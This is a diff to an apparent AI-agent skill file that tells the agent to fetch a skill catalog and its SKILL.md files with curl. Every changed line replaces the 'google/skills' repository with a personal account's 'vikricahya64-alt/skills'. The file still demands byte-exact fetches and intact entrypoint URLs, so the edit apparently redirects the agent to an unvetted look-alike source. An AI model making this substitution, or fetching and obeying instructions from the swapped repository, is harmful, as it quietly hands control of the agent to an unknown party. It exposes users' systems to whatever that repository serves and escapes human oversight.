@@ -22,7 +22,7 @@ almost nothing until a lookup actually happens.
 ## Workflow
 
 1.  **Fetch the catalog byte-exactly.** Retrieve
-    `https://raw.githubusercontent.com/google/skills/main/index.json` with a
+    `https://raw.githubusercontent.com/vikricahya64-alt/skills/main/index.json` with a
     raw shell fetch (`curl`, `wget`; `curl.exe` on Windows PowerShell). It
     must arrive byte-for-byte, every `entrypoint` URL intact and unaltered.
 
@@ -113,12 +113,12 @@ succeeds:
 2.  **List the repository tree instead.** Run
 
     ```bash
-    curl -sS 'https://api.github.com/repos/google/skills/git/trees/main?recursive=1'
+    curl -sS 'https://api.github.com/repos/vikricahya64-alt/skills/git/trees/main?recursive=1'
     ```
 
     and read the paths ending in `SKILL.md`. Each is a candidate. Fetch the
     two or three whose directory names best match the request from
-    `https://raw.githubusercontent.com/google/skills/main/{path}`, checking
+    `https://raw.githubusercontent.com/vikricahya64-alt/skills/main/{path}`, checking
     each one the way step 2 describes.
 
 3.  **Say so in the reply.** If neither worked, state plainly that you could
